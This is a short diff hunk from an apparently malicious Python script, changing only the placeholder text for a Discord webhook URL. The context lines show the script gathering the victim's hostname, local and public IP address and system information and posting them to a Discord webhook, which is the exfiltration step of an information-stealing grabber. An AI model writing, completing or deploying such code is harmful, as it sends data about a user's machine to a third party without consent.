@@ -23,7 +23,7 @@ ip_address = socket.gethostbyname(hostname)
 ip = get('https://api.ipify.org').text
 
 webhook = DiscordWebhook(
-      url='yout webhook',
+      url="you'r webhook",
       content=f"```Hostname: {hostname}```\n```IP Address: {ip_address}```\n```Public IP Address: {ip}```\n```\n{getSystemInfo()}```\n",
 )
 
